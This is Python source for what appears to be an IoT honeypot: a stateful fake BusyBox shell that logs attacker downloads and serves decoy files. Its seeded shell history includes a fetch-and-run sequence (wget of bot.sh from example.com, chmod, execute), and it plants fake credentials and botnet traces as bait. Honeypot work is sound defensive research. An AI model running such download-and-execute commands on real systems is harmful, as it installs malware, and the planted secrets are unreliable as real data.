#!/usr/bin/env python3
"""
fake_commands.py — Stateful BusyBox/Linux shell emulator for IoT honeypot.

Key design: every FakeShell instance is per-session and fully stateful.
  - wget/tftp actually adds files to /tmp — subsequent ls shows them
  - chmod marks files executable in session state
  - Running ./file or /tmp/file adds a fake process to ps
  - kill removes it from ps
  - mkdir/rm mutate the session filesystem
  - History grows as attacker types commands
  - Consistent network config, CPU info across the session
"""

import random
import time
import os
import copy

import device_identity as dev

# ─── Static filesystem skeleton (module-level READ-ONLY template) ─────────────
_FS_TEMPLATE = {
    "/":          ["bin", "dev", "etc", "home", "lib", "mnt", "proc", "root",
                   "sbin", "sys", "tmp", "usr", "var", "backup", "data"],
    "/bin":       ["ash", "busybox", "cat", "chmod", "cp", "date", "df", "echo",
                   "grep", "kill", "ls", "mkdir", "mount", "mv", "ping", "ps",
                   "rm", "sh", "sleep", "tar", "touch", "wget"],
    "/etc":       ["config", "crontab", "dvr.conf", "group", "hosts", "init.d",
                   "inittab", "mtab", "passwd", "profile", "rc.d", "resolv.conf",
                   "shadow", "ssh", "syslog.conf"],
    "/etc/ssh":   ["sshd_config", "ssh_host_ecdsa_key", "ssh_host_rsa_key"],
    "/home":      ["admin", "user"],
    "/home/admin":["bash_history", ".bashrc", ".profile", "notes.txt"],
    "/mnt":       ["flash", "mtd", "nand"],
    "/mnt/mtd":   ["Config", "Firmware", "Log"],
    "/mnt/mtd/Config": ["account.ini", "network.ini", "system.ini"],
    "/proc":      ["cpuinfo", "meminfo", "mounts", "net", "sys", "version"],
    "/root":      [".bash_history", ".bashrc", ".profile", ".ssh",
                   "passwords.txt", ".env"],
    "/root/.ssh": ["authorized_keys", "id_rsa", "id_rsa.pub", "known_hosts"],
    # /tmp pre-seeded with traces of previous attackers
    "/tmp":       [".sora", "mozi.m", "kworker", ".X11-unix"],
    "/var":       ["log", "run", "tmp", "www"],
    "/var/log":   ["auth.log", "messages", "syslog", "dvr.log"],
    "/var/www":   ["cgi-bin", "html", ".env", "config.php"],
    "/var/www/html": ["index.html", "admin", "upload.php"],
    "/backup":    ["db.sql", "passwords.txt", "site.tar.gz", "admin_backup.zip"],
    "/data":      ["config.json", "users.db", "recordings"],
}

# Static file contents
_FILE_CONTENTS = {
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/ash\n"
        "bin:x:1:1:bin:/bin:/bin/false\n"
        "daemon:x:2:2:daemon:/usr/sbin:/bin/false\n"
        f"admin:x:500:500:Administrator:/home/admin:/bin/ash\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/bin/false\n"
    ),
    "/etc/shadow": (
        "root:$6$salt$Wh5p4Q0/Kv.RN2sHrk7Cx5fX5QY3hjNJ0GZrp3nNpV1XkBb/:18950:0:99999:7:::\n"
        "admin:$6$salt$AbCdEfGhIj/KlMnOpQrStUvWxYz0123456789abc.:18950:0:99999:7:::\n"
    ),
    "/etc/hosts": (
        "127.0.0.1\tlocalhost\n"
        "::1\t\tlocalhost ip6-localhost\n"
        f"192.168.1.1\tgateway router.local\n"
        f"192.168.1.108\tcamera01.local\n"
    ),
    "/etc/dvr.conf": (
        "[System]\n"
        f"DeviceName={dev.HIK['model']}\n"
        "Language=English\nVideoStandard=NTSC\nMaxConnections=20\n\n"
        "[Network]\nIPMode=Static\n"
        f"IP={dev.HIK['lan_ip']}\nSubnet={dev.HIK['subnet']}\n"
        f"Gateway={dev.HIK['gateway']}\nDNS1={dev.HIK['dns1']}\n\n"
        "[Account]\nUsername=admin\nPassword=admin123\nEnable=1\n"
    ),
    "/mnt/mtd/Config/account.ini": (
        "[User1]\nusername=admin\npassword=admin\ngroup=0\n"
        "[User2]\nusername=guest\npassword=guest\ngroup=1\n"
    ),
    "/root/passwords.txt": (
        "== Device Admin Credentials ==\n"
        "router: admin/admin\n"
        "camera: admin/12345\n"
        "dvr: admin/888888\n"
        "backup server: backup/Backup2024!\n"
        "database: dbuser/MyDB_P@ssw0rd\n"
    ),
    "/root/.env": (
        "APP_ENV=production\n"
        "DB_HOST=192.168.1.50\nDB_USER=admin\nDB_PASS=SuperSecret2024!\n"
        "API_KEY=sk-proj-abc123xyz789def\n"
        "JWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n"
        "AWS_KEY=AKIAIOSFODNN7EXAMPLE\n"
        "AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
    ),
    "/home/admin/.bash_history": (
        "mysql -u root -p\n"
        "wget http://backup.local/data.sql\n"
        "sudo su\ncat /etc/passwd\ncd /backup\nls -la\n"
        "tar xzf site.tar.gz\n./install.sh\ncrontab -e\n"
    ),
    "/proc/cpuinfo": (
        "Processor\t: ARM926EJ-S rev 5 (v5l)\n"
        "BogoMIPS\t: 218.72\n"
        "Features\t: swp half thumb fastmult edsp java\n"
        "CPU implementer\t: 0x41\nCPU architecture: 5TEJ\n"
        "CPU variant\t: 0x0\nCPU part\t: 0x926\nCPU revision\t: 5\n"
        f"Hardware\t: {dev.HIK['cpu']}\nRevision\t: 0000\n"
    ),
    "/proc/meminfo": (
        "MemTotal:          61440 kB\nMemFree:            3220 kB\n"
        "Buffers:            1024 kB\nCached:            12345 kB\n"
        "SwapTotal:             0 kB\nSwapFree:              0 kB\n"
    ),
    "/proc/version": dev.HIK["kernel"] + "\n",
    "/proc/mounts": (
        "rootfs / rootfs rw 0 0\n"
        "/dev/root / squashfs ro,relatime 0 0\n"
        "proc /proc proc rw,relatime 0 0\n"
        "tmpfs /tmp tmpfs rw,relatime 0 0\n"
        "/dev/mtdblock3 /mnt/mtd jffs2 rw,relatime 0 0\n"
    ),
    "/backup/passwords.txt": (
        "== Backup Passwords ==\n"
        "admin:Admin@2024\nroot:ProductionKey999\n"
        "dbuser:MyDB_P@ssw0rd\nbackup:Backup2024!\n"
    ),
    "/var/www/.env": (
        "APP_ENV=production\nDB_HOST=127.0.0.1\n"
        "DB_NAME=webapp\nDB_USER=webapp\nDB_PASS=webapp_secret_2024\n"
    ),
    "/var/log/syslog": (
        "Feb 18 10:23:01 camera01 syslogd: restart\n"
        "Feb 18 10:23:02 camera01 kernel: NET: Registered protocol family 1\n"
        "Feb 18 10:23:05 camera01 telnetd[45]: session opened for user root\n"
        "Feb 18 10:45:11 camera01 sshd[102]: Failed password for admin from "
        "45.33.32.156 port 56789 ssh2\n"
    ),
}

PROMPT_VARIANTS = [
    "root@(none):/# ",
    "root@dvr:~# ",
    "[root@camera ~]# ",
    "/ # ",
    "# ",
    "root@NVR:~# ",
]

# Background processes that always appear in ps (pre-existing infection)
_STATIC_PROCS = [
    (1,   "init",                            "S"),
    (2,   "[kthreadd]",                      "SW"),
    (12,  "/sbin/syslogd -n",                "S"),
    (23,  "/sbin/klogd -n",                  "S"),
    (45,  "/usr/sbin/telnetd -l /bin/ash",   "S"),
    (67,  "/usr/sbin/httpd -f",              "S"),
    (89,  "/usr/sbin/rtspd",                 "S"),
    (102, "/usr/bin/ipcam -c /etc/dvr.conf", "S"),
    (312, "/tmp/mozi.m",                     "S"),   # previous botnet infection
    (313, "/tmp/.sora",                      "S"),
    (314, "/bin/sh -c /tmp/mozi.m",          "S"),
    (512, "kworker/u2:1",                    "SW"),
]


class FakeShell:
    """
    Fully stateful per-session BusyBox shell.

    State that persists across commands within a session:
      - cwd              current working directory
      - _tmp_files       files in /tmp (mutated by wget/rm)
      - _extra_dirs      extra directories created by mkdir
      - _extra_files     extra files created by touch/wget outside /tmp
      - _file_perms      chmod results: path -> permissions string
      - _user_procs      processes started by attacker: pid -> cmd string
      - _history         commands typed this session
      - _session_start   epoch for consistent uptime
    """

    def __init__(self, ip="unknown"):
        self.ip            = ip
        self.cwd           = "/"
        self.prompt        = random.choice(PROMPT_VARIANTS)
        self._session_start = time.time()
        self.env = {
            "HOME":  "/root",
            "PATH":  "/bin:/sbin:/usr/bin:/usr/sbin",
            "USER":  "root",
            "SHELL": "/bin/ash",
            "TERM":  "vt100",
            "PS1":   self.prompt,
        }
        # Per-session mutable /tmp
        self._tmp_files: list  = list(_FS_TEMPLATE["/tmp"])
        # Extra created dirs/files outside /tmp
        self._extra_dirs:  dict = {}       # path -> []
        self._extra_files: dict = {}       # path -> content
        # chmod tracking: path -> "rwxrwxrwx" style
        self._file_perms:  dict = {}
        # Attacker-started processes: pid -> cmd
        self._next_pid = 900
        self._user_procs: dict = {}
        # Session command history
        self._history: list = [
            "ls", "cat /etc/passwd", "cd /root", "cat passwords.txt",
            "wget http://example.com/bot.sh", "chmod +x bot.sh", "./bot.sh",
        ]
        self._download_log: list = []

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _resolve(self, path: str) -> str:
        """Resolve path relative to cwd."""
        if not path or path in ("~", "~root"):
            return "/root"
        if not path.startswith("/"):
            path = self.cwd.rstrip("/") + "/" + path
        return os.path.normpath(path)

    def _fs_list(self, path: str):
        """Return directory listing for path or None if not a directory."""
        if path == "/tmp":
            return self._tmp_files
        if path in self._extra_dirs:
            return self._extra_dirs[path]
        return _FS_TEMPLATE.get(path)

    def _fs_isdir(self, path: str) -> bool:
        return self._fs_list(path) is not None

    def _fs_isfile(self, path: str) -> bool:
        if path in _FILE_CONTENTS or path in self._extra_files:
            return True
        # Check if filename is in parent dir listing
        parent = os.path.dirname(path)
        fname  = os.path.basename(path)
        listing = self._fs_list(parent)
        return listing is not None and fname in listing

    def _add_to_tmp(self, filename: str):
        if filename not in self._tmp_files:
            self._tmp_files.append(filename)

    def _remove_from_tmp(self, filename: str):
        if filename in self._tmp_files:
            self._tmp_files.remove(filename)

    def _next_user_pid(self) -> int:
        self._next_pid += random.randint(1, 5)
        return self._next_pid

    # ─── execute ─────────────────────────────────────────────────────────────

    def execute(self, raw_command: str) -> str:
        raw = (raw_command or "").strip()
        if not raw:
            return ""

        # Append to history
        self._history.append(raw)

        # Handle && chaining
        if " && " in raw:
            out = ""
            for part in raw.split(" && "):
                result = self.execute(part.strip())
                out += result
                # Stop chain on "error" (command not found etc.)
                if "not found" in result or "No such file" in result:
                    break
            return out

        # Handle ; chaining
        if ";" in raw:
            return "\n".join(
                self.execute(p.strip()) for p in raw.split(";") if p.strip()
            )

        # Strip output redirections but keep command
        cleaned = raw.split(">")[0].strip() if ">" in raw else raw
        # Strip background & operator
        cleaned = cleaned.rstrip("&").strip()

        parts = cleaned.split()
        if not parts:
            return ""

        # Handle path-based execution: ./file, /tmp/file, /bin/file
        if parts[0].startswith("./") or parts[0].startswith("/"):
            return self._exec_binary(parts[0], parts[1:])

        cmd  = parts[0].lower()
        args = parts[1:]

        # Check dedicated handler
        handler = getattr(self, f"_cmd_{cmd.replace('-','_').replace('/','_')}", None)
        if handler:
            return handler(args)

        # busybox <applet> dispatch
        if cmd == "busybox":
            return self._cmd_busybox(args)

        # wget/curl/tftp aliases
        if cmd in ("wget", "curl", "tftp"):
            return self._cmd_wget(args, tool=cmd)

        # chmod/mkdir/rm etc — now stateful
        if cmd == "chmod":  return self._cmd_chmod(args)
        if cmd == "mkdir":  return self._cmd_mkdir(args)
        if cmd == "rm":     return self._cmd_rm(args)
        if cmd == "rmdir":  return self._cmd_rmdir(args)
        if cmd == "touch":  return self._cmd_touch(args)
        if cmd == "mv":     return self._cmd_mv(args)
        if cmd == "cp":     return self._cmd_cp(args)
        if cmd == "kill":   return self._cmd_kill(args)
        if cmd == "killall":return self._cmd_killall(args)

        # Silent no-ops
        if cmd in ("sync", "reboot", "halt", "poweroff", "export",
                   "source", ".", "eval", "exec", "nohup", "setsid",
                   "sh", "ash", "bash"):
            return ""

        if cmd in ("exit", "logout", "quit"):
            return ""

        if cmd == "cd":
            return self._cmd_cd(args)

        return f"{parts[0]}: command not found\n"

    # ─── Binary execution ─────────────────────────────────────────────────────

    def _exec_binary(self, path: str, args: list) -> str:
        """Handle execution of a binary by path: ./file, /tmp/file, etc."""
        resolved = self._resolve(path)
        fname    = os.path.basename(resolved)

        # Check it exists
        if not self._fs_isfile(resolved):
            return f"-ash: {path}: not found\n"

        # Check executable permission
        perm = self._file_perms.get(resolved, "")
        parent_dir = os.path.dirname(resolved)
        if parent_dir == "/tmp" and fname in self._tmp_files and not perm:
            # Files in /tmp from wget default to not executable until chmod
            return f"-ash: {path}: Permission denied\n"

        # Simulate running the binary — add to ps
        pid = self._next_user_pid()
        cmd_str = resolved + (" " + " ".join(args) if args else "")
        self._user_procs[pid] = cmd_str

        # The binary "runs" silently (like real malware)
        return ""

    # ─── Core commands ────────────────────────────────────────────────────────

    def _cmd_cd(self, args):
        target = args[0] if args else "~"
        resolved = self._resolve(target)
        if self._fs_isdir(resolved):
            self.cwd = resolved
            return ""
        return f"cd: {target}: No such file or directory\n"

    def _cmd_pwd(self, args):
        return self.cwd + "\n"

    def _cmd_ls(self, args):
        # Find path arg (last arg that doesn't start with -)
        path = self.cwd
        for a in reversed(args):
            if not a.startswith("-"):
                path = self._resolve(a)
                break

        contents = self._fs_list(path)
        if contents is None:
            # Maybe it's a file
            if self._fs_isfile(path):
                contents = [os.path.basename(path)]
            else:
                return f"ls: {path}: No such file or directory\n"

        long_fmt    = any(a in args for a in ("-l", "-la", "-al", "-lh", "-lah"))
        show_hidden = any(a in args for a in ("-a", "-la", "-al", "-lah"))

        files = list(contents)
        if show_hidden:
            files = [".", ".."] + files

        if not long_fmt:
            return "  ".join(files) + "\n"

        lines = [f"total {len(files) * 4}"]
        for f in files:
            fpath   = path.rstrip("/") + "/" + f
            is_dir  = self._fs_isdir(fpath) or f in (".", "..")
            hidden  = f.startswith(".")
            custom_perm = self._file_perms.get(fpath, "")

            if custom_perm:
                perm = custom_perm
            elif is_dir:
                perm = "drwxr-xr-x"
            elif path == "/tmp":
                perm = "-rw-r--r--"   # not executable until chmod
            elif hidden:
                perm = "-rwxr-xr-x"
            else:
                perm = "-rw-r--r--"

            size = random.randint(28000, 120000) if path == "/tmp" else random.randint(512, 8192)
            lines.append(f"{perm}  1 root  root  {size:>8}  Feb 18 09:12  {f}")
        return "\n".join(lines) + "\n"

    def _cmd_cat(self, args):
        if not args:
            return "cat: missing operand\n"
        path = self._resolve(args[0])
        # Check session-level extra files first
        if path in self._extra_files:
            return self._extra_files[path]
        if path in _FILE_CONTENTS:
            return _FILE_CONTENTS[path]
        # Fuzzy matches
        if "password" in path.lower() or "passwd" in path.lower():
            return _FILE_CONTENTS["/etc/passwd"]
        if "shadow" in path.lower():
            return "cat: /etc/shadow: Permission denied\n"
        if ".env" in path.lower():
            return _FILE_CONTENTS["/root/.env"]
        if "dvr.conf" in path.lower():
            return _FILE_CONTENTS["/etc/dvr.conf"]
        if self._fs_isdir(path):
            return f"cat: {args[0]}: Is a directory\n"
        return f"cat: {args[0]}: No such file or directory\n"

    def _cmd_echo(self, args):
        text = " ".join(args).replace("\\n", "\n")
        return text + "\n"

    def _cmd_uname(self, args):
        if "-a" in args:
            return (f"Linux dvr 3.10.14 #1 SMP PREEMPT "
                    f"Mon Sep 18 16:26:25 CST 2017 {dev.HIK['arch']} GNU/Linux\n")
        if "-r" in args: return "3.10.14\n"
        if "-m" in args: return f"{dev.HIK['arch']}\n"
        if "-s" in args: return "Linux\n"
        if "-n" in args: return "dvr\n"
        return "Linux\n"

    def _cmd_whoami(self, args):  return "root\n"
    def _cmd_id(self, args):      return "uid=0(root) gid=0(root) groups=0(root),10(wheel)\n"
    def _cmd_hostname(self, args):return "dvr\n"

    def _cmd_ps(self, args):
        lines = ["  PID USER       VSZ STAT COMMAND"]
        for pid, cmd, stat in _STATIC_PROCS:
            lines.append(f"  {pid:<4} root      {'1024':>5} {stat}    {cmd}")
        # Attacker's started processes
        for pid, cmd in sorted(self._user_procs.items()):
            lines.append(f"  {pid:<4} root      {'2048':>5} S    {cmd}")
        cur_pid = self._next_pid + 10
        lines.append(f"  {cur_pid:<4} root       512 R    ps")
        return "\n".join(lines) + "\n"

    def _cmd_ifconfig(self, args):
        return (
            f"eth0      Link encap:Ethernet  HWaddr {dev.HIK['mac_upper']}\n"
            f"          inet addr:{dev.HIK['lan_ip']}  Bcast:192.168.1.255  Mask:{dev.HIK['subnet']}\n"
            "          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n"
            "          RX packets:38291 errors:0 dropped:0 overruns:0 frame:0\n"
            "          TX packets:22145 errors:0 dropped:0 overruns:0 carrier:0\n"
            f"          inet6 addr: fe80::4619:b6ff:fe7a:2cd9/64 Scope:Link\n\n"
            "lo        Link encap:Local Loopback\n"
            "          inet addr:127.0.0.1  Mask:255.0.0.0\n"
            "          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n"
        )

    def _cmd_ip(self, args):
        if args and args[0] in ("addr", "a", "address"):
            return (
                "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n"
                "    inet 127.0.0.1/8 scope host lo\n"
                f"2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n"
                f"    link/ether {dev.HIK['mac']} brd ff:ff:ff:ff:ff:ff\n"
                f"    inet {dev.HIK['lan_ip']}/24 brd 192.168.1.255 scope global eth0\n"
            )
        if args and args[0] == "route":
            return (
                "default via 192.168.1.1 dev eth0\n"
                "192.168.1.0/24 dev eth0 proto kernel scope link\n"
            )
        return ""

    def _cmd_netstat(self, args):
        return (
            "Active Internet connections (servers and established)\n"
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
            "tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN\n"
            "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n"
            "tcp        0      0 0.0.0.0:554             0.0.0.0:*               LISTEN\n"
            "tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN\n"
            f"tcp        0      0 {dev.HIK['lan_ip']}:23        {self.ip}:54321      ESTABLISHED\n"
        )

    def _cmd_free(self, args):
        return (
            "             total       used       free     shared    buffers     cached\n"
            "Mem:         61440      58220       3220          0       1024      12345\n"
            "-/+ buffers/cache:      44851      16589\n"
            "Swap:            0          0          0\n"
        )

    def _cmd_df(self, args):
        return (
            "Filesystem           1K-blocks      Used Available Use% Mounted on\n"
            "/dev/root                30720     28456      2264  93% /\n"
            "tmpfs                    30720       124     30596   0% /tmp\n"
            "/dev/mtdblock3           10240      8192      2048  80% /mnt/mtd\n"
        )

    def _cmd_uptime(self, args):
        elapsed = int(time.time() - self._session_start) + random.randint(86400*5, 86400*30)
        days    = elapsed // 86400
        hours   = (elapsed % 86400) // 3600
        mins    = (elapsed % 3600) // 60
        return f" 12:34:56 up {days} days, {hours}:{mins:02d}, load average: 0.08, 0.12, 0.09\n"

    def _cmd_date(self, args):
        return time.strftime("%a %b %d %H:%M:%S UTC %Y\n")

    def _cmd_find(self, args):
        results = [
            "/etc/dvr.conf", "/mnt/mtd/Config/system.ini",
            "/var/www/.env", "/root/.env", "/backup/passwords.txt",
        ]
        # If -name given, filter slightly
        if "-name" in args:
            idx = args.index("-name")
            if idx + 1 < len(args):
                pat = args[idx + 1].replace("*", "")
                results = [r for r in results if pat in r] or results
        return "\n".join(results) + "\n"

    def _cmd_grep(self, args):
        if len(args) >= 2 and "passwd" in " ".join(args):
            return "root:x:0:0:root:/root:/bin/ash\nadmin:x:500:500:Admin:/home/admin:/bin/ash\n"
        return ""

    def _cmd_env(self, args):
        return "\n".join(f"{k}={v}" for k, v in self.env.items()) + "\n"

    def _cmd_printenv(self, args):
        return self._cmd_env(args)

    def _cmd_history(self, args):
        return "\n".join(f"  {i+1:>4}  {c}" for i, c in enumerate(self._history)) + "\n"

    def _cmd_ping(self, args):
        host = next((a for a in args if not a.startswith("-")), "127.0.0.1")
        return (
            f"PING {host} ({host}): 56 data bytes\n"
            f"64 bytes from {host}: seq=0 ttl=64 time=0.412 ms\n"
            f"64 bytes from {host}: seq=1 ttl=64 time=0.398 ms\n"
            f"64 bytes from {host}: seq=2 ttl=64 time=0.405 ms\n\n"
            f"--- {host} ping statistics ---\n"
            "3 packets transmitted, 3 received, 0% packet loss\n"
        )

    def _cmd_tar(self, args):   return ""
    def _cmd_sleep(self, args): return ""
    def _cmd_dd(self, args):    return "0+0 records in\n0+0 records out\n"

    def _cmd_which(self, args):
        cmd = args[0] if args else ""
        known = {
            "wget": "/bin/wget", "curl": "/bin/curl", "sh": "/bin/sh",
            "ash": "/bin/ash",   "nc": "/bin/nc",     "tftp": "/usr/bin/tftp",
            "ps": "/bin/ps",     "ls": "/bin/ls",     "cat": "/bin/cat",
            "id": "/usr/bin/id", "busybox": "/bin/busybox",
        }
        r = known.get(cmd, "")
        return r + "\n" if r else f"{cmd}: not found\n"

    # ─── Stateful file/process operations ─────────────────────────────────────

    def _cmd_chmod(self, args):
        """chmod — actually marks the file executable so it can be run."""
        if not args:
            return ""
        mode_str = args[0]
        targets  = args[1:]
        for t in targets:
            resolved = self._resolve(t)
            # Determine permission string from mode
            if mode_str in ("+x", "777", "+rwx", "a+x", "0777", "755"):
                perm = "-rwxrwxrwx"
            elif mode_str in ("644", "-x", "a-x"):
                perm = "-rw-r--r--"
            else:
                perm = "-rwxr-xr-x"
            self._file_perms[resolved] = perm
        return ""

    def _cmd_mkdir(self, args):
        """mkdir — creates directory in session state."""
        for a in args:
            if a.startswith("-"):
                continue
            path = self._resolve(a)
            if not self._fs_isdir(path):
                self._extra_dirs[path] = []
                # Also add name to parent listing
                parent = os.path.dirname(path)
                plist  = self._fs_list(parent)
                if isinstance(plist, list):
                    bname = os.path.basename(path)
                    if bname not in plist:
                        if parent == "/tmp":
                            self._tmp_files.append(bname)
                        else:
                            self._extra_dirs.setdefault(parent, list(plist))
                            self._extra_dirs[parent].append(bname)
        return ""

    def _cmd_rm(self, args):
        """rm — removes files from session state."""
        for a in args:
            if a.startswith("-"):
                continue
            path = self._resolve(a)
            bname = os.path.basename(path)
            parent = os.path.dirname(path)
            if parent == "/tmp":
                self._remove_from_tmp(bname)
            if path in self._extra_files:
                del self._extra_files[path]
            if path in self._file_perms:
                del self._file_perms[path]
            # Kill associated processes
            for pid, cmd in list(self._user_procs.items()):
                if path in cmd or bname in cmd:
                    del self._user_procs[pid]
        return ""

    def _cmd_rmdir(self, args):
        for a in args:
            if a.startswith("-"):
                continue
            path = self._resolve(a)
            if path in self._extra_dirs:
                del self._extra_dirs[path]
        return ""

    def _cmd_touch(self, args):
        for a in args:
            if a.startswith("-"):
                continue
            path = self._resolve(a)
            if not self._fs_isfile(path):
                self._extra_files[path] = ""
                bname = os.path.basename(path)
                parent = os.path.dirname(path)
                if parent == "/tmp":
                    self._add_to_tmp(bname)
        return ""

    def _cmd_mv(self, args):
        args = [a for a in args if not a.startswith("-")]
        if len(args) < 2:
            return ""
        src, dst = self._resolve(args[0]), self._resolve(args[1])
        content = self._extra_files.pop(src, None)
        if content is not None:
            self._extra_files[dst] = content
        perm = self._file_perms.pop(src, None)
        if perm:
            self._file_perms[dst] = perm
        # Update /tmp lists
        s_base = os.path.basename(src)
        d_base = os.path.basename(dst)
        if s_base in self._tmp_files:
            self._tmp_files.remove(s_base)
            self._add_to_tmp(d_base)
        return ""

    def _cmd_cp(self, args):
        args = [a for a in args if not a.startswith("-")]
        if len(args) < 2:
            return ""
        src, dst = self._resolve(args[0]), self._resolve(args[1])
        # Copy permission if known
        perm = self._file_perms.get(src)
        if perm:
            self._file_perms[dst] = perm
        d_base = os.path.basename(dst)
        d_parent = os.path.dirname(dst)
        if d_parent == "/tmp":
            self._add_to_tmp(d_base)
        return ""

    def _cmd_kill(self, args):
        """kill PID — removes process from ps."""
        for a in args:
            if a.startswith("-"):
                continue
            try:
                pid = int(a)
                self._user_procs.pop(pid, None)
            except ValueError:
                pass
        return ""

    def _cmd_killall(self, args):
        """killall name — kills matching user procs."""
        for a in args:
            if a.startswith("-"):
                continue
            for pid, cmd in list(self._user_procs.items()):
                if a in cmd:
                    del self._user_procs[pid]
        return ""

    # ─── wget / curl / tftp ───────────────────────────────────────────────────

    def _cmd_wget(self, args, tool="wget"):
        url = next((a for a in args if "://" in a), None)
        if not url and args:
            url = next((a for a in args if not a.startswith("-")), None)
        if not url:
            url = "http://unknown/bot"

        # -O / --output-document flag
        out_flag = None
        for i, a in enumerate(args):
            if a in ("-O", "--output-document") and i + 1 < len(args):
                out_flag = args[i + 1]
                break

        filename = out_flag.split("/")[-1] if out_flag else (url.split("/")[-1] or "index.html")
        save_path = out_flag if out_flag else f"/tmp/{filename}"
        # Ensure file appears in /tmp
        bname = os.path.basename(save_path)
        if os.path.dirname(save_path) in ("/tmp", ""):
            self._add_to_tmp(bname)
        self._extra_files[self._resolve(save_path)] = b""
        self._download_log.append(url)

        if tool == "curl":
            if "-s" in args or "--silent" in args:
                return ""
            return "  % Total  % Received  Average Speed\n100  1247  100  1247  8.9K/s\n"

        host = url.split("/")[2] if "/" in url[8:] else url
        return (
            f"--2026-02-18 12:34:56--  {url}\n"
            f"Resolving {host}... 198.51.100.7\n"
            f"Connecting to {host}:80... connected.\n"
            "HTTP request sent, awaiting response... 200 OK\n"
            "Length: 47856 (47K) [application/octet-stream]\n"
            f"Saving to: '{filename}'\n\n"
            f"{filename:<30} 100%[===================>]  46.73K  --.-KB/s    in 0.1s\n\n"
            f"2026-02-18 12:34:56 (423 KB/s) - '{filename}' saved [47856/47856]\n"
        )

    def _cmd_tftp(self, args):
        fname = next((a for a in args if not a.startswith("-") and "/" not in a), "file")
        self._add_to_tmp(fname)
        return f"tftp: received {fname}\n"

    # ─── busybox ──────────────────────────────────────────────────────────────

    def _cmd_busybox(self, args):
        if not args:
            return self._busybox_info()
        sub = args[0].lower()
        handler = getattr(self, f"_cmd_{sub}", None)
        if handler:
            return handler(args[1:])
        return f"{args[0]}: applet not found\n"   # Mirai ECCHI probe

    def _busybox_info(self):
        return (
            "BusyBox v1.28.4 (2019-12-16 16:23:45 UTC) multi-call binary.\n"
            "Usage: busybox [function [arguments]...]\n\n"
            "Currently defined functions:\n"
            "  [, [[, ash, awk, cat, chmod, cp, date, df, echo, env, find, grep,\n"
            "  hostname, id, ifconfig, kill, ls, mkdir, mount, mv, netstat, ping,\n"
            "  ps, rm, sed, sh, sleep, sync, tar, touch, uname, uptime, vi, wget, which\n"
        )

    # ─── Extra commands ───────────────────────────────────────────────────────

    def _cmd_iptables(self, args):
        if "-F" in args or "--flush" in args:
            return ""
        if "-L" in args or "--list" in args:
            return (
                "Chain INPUT (policy ACCEPT)\n"
                "target  prot opt source      destination\n"
                "ACCEPT  tcp  --  anywhere    anywhere    tcp dpt:23\n"
                "ACCEPT  tcp  --  anywhere    anywhere    tcp dpt:80\n"
                "ACCEPT  tcp  --  anywhere    anywhere    tcp dpt:554\n\n"
                "Chain FORWARD (policy DROP)\n\nChain OUTPUT (policy ACCEPT)\n"
            )
        return ""

    def _cmd_crontab(self, args):
        if "-l" in args:
            return (
                "# m h  dom mon dow   command\n"
                "*/5 * * * * /tmp/mozi.m > /dev/null 2>&1\n"
                "@reboot /tmp/.sora\n"
            )
        return ""

    def _cmd_dmesg(self, args):
        return (
            "[    0.000000] Booting Linux on physical CPU 0x0\n"
            "[    0.000000] Linux version 3.10.14 (gcc version 4.9.4) #1 SMP PREEMPT\n"
            "[    0.123456] NET: Registered protocol family 1\n"
            "[    0.234567] hi_osal: module license 'Proprietary' taints kernel.\n"
            "[    1.234567] eth0: Link is Up - 100Mbps/Full\n"
            "[    1.345678] mmc0: new high speed SD card at slot 0\n"
        )

    def _cmd_mount(self, args):
        return (
            "rootfs on / type rootfs (rw)\n"
            "/dev/root on / type squashfs (ro,relatime)\n"
            "proc on /proc type proc (rw,relatime)\n"
            "tmpfs on /tmp type tmpfs (rw,relatime)\n"
            "/dev/mtdblock3 /mnt/mtd jffs2 rw,relatime 0 0\n"
        )

    # ─── Public accessors ─────────────────────────────────────────────────────

    def get_downloaded_urls(self):
        return list(self._download_log)


# Backward-compat alias (imported by other modules)
FAKE_FS       = _FS_TEMPLATE
FILE_CONTENTS = _FILE_CONTENTS


class FakeCommandHandler:
    def __init__(self):
        self._shells = {}

    def get_shell(self, session_id="default"):
        if session_id not in self._shells:
            self._shells[session_id] = FakeShell()
        return self._shells[session_id]

    def execute(self, command, session_id="default"):
        return self.get_shell(session_id).execute(command)


FAKE_CMD_HANDLER = FakeCommandHandler()
